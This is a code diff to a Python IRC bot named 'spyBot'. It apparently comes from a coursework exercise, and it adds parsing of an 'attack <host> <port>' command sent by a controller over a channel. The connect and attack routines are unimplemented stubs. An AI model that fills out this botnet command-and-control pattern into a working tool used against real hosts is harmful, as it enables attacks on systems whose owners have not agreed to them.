@@ -23,6 +23,8 @@ class Bot():
         self.nickname = 'spyBot'
         self.controller = None
         self.controller_nickname = None
+        self.target_host = None
+        self.target_port = None
     
     def __send_to_channel(self, msg):
         '''
@@ -77,6 +79,14 @@ class Bot():
         self.__send_message('USER ' + self.nickname + ' ' + self.nickname + ' ' + self.nickname + ' :\n')
         self.__send_message('NICK ' + self.nickname + '\n')
         self.__send_message('JOIN ' + self.channel + '\n')
+
+    def __connect_to_target(self):
+        '''
+        connect to target address using:
+            target_host
+            target_port
+        '''
+        raise NotImplementedError()
 
     def __handle_command(self, msg):
         _, cmd = msg.split(' :')
@@ -205,7 +215,24 @@ class Bot():
         perform attack command
         cmd format --> attack <host-name> <port>
         '''
-        raise NotImplementedError()
+        try:
+            _, target_host, target_port = cmd.split(' ')
+        except ValueError:
+            raise ValueError('Failed to split attack.')
+        
+        if self.__validate_port(target_port):
+            self.target_host = target_host
+            self.target_port = int(target_port)
+        else:
+            raise ValueError('Invalid port: {}'.format(self.target_port))
+
+        log('Attacking {}:{}'.format(self.target_host, self.target_port))
+        
+        # connect to target
+        self.__connect_to_target()
+        
+        # perform attack
+
     
     def __do_move(self, cmd):
         '''
@@ -225,6 +252,15 @@ class Bot():
         self.channel = '#' + channel
         self.irc_socket.close()
         self.start_bot()
+    
+    def __attack():
+        '''
+        Every bot will connect to the given host/port and 
+        send a message containing two entries: a counter and
+        the nick of the bot. On the next attack the counter 
+        should be increased by 1.
+        '''
+        raise NotImplementedError()
 
     def __validate_port(self, port):
         return int(port) in range(0, 65536)
